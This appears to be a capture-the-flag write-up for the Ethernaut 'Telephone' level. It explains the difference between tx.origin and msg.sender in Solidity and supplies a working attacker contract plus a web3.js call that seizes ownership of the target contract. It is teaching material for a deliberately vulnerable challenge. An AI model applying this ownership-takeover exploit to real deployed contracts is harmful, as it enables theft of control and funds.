Function calls can be chained, which explains why `tx.origin` can be different from `msg.sender`:

```solidity
if (tx.origin != msg.sender) {
  owner = _owner;
}
```

Deploy this contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address) external;
}

contract Ring {

  address TARGET = 0x1a44601091adFD6801b1Bf8F6466d0A7e6152650;

  constructor() {}

  function ring() public {
    Telephone(TARGET).changeOwner(msg.sender);
  }
}
```

And just call it:

```js
abi = '[{"inputs":[],"name":"ring","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"stateMutability":"nonpayable","type":"constructor"}]';
agent = new web3.eth.Contract(JSON.parse(abi), '0x409fe684247eb911aeb27b6732643e7d8c02b0db');
agent.methods.ring().send({from: player}, function(error, data) {console.log(data);});
```
